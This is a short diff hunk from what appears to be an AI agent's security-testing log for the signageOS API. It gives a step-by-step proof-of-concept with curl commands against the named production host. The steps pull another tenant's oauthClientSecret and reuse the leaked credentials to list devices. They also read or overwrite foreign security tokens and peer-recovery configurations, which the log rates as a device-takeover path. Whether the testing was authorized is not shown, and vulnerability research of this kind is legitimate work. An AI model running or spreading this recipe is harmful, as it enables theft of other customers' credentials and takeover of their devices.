@@ -592,3 +592,4 @@ verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "
 impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
 testability: AUTH_HELPED
 [NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (get own UID from `sos organization list`); 3) repeat on a second tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
+## 2026-08-08 05:27:16 UTC [box] (model bigpickle)
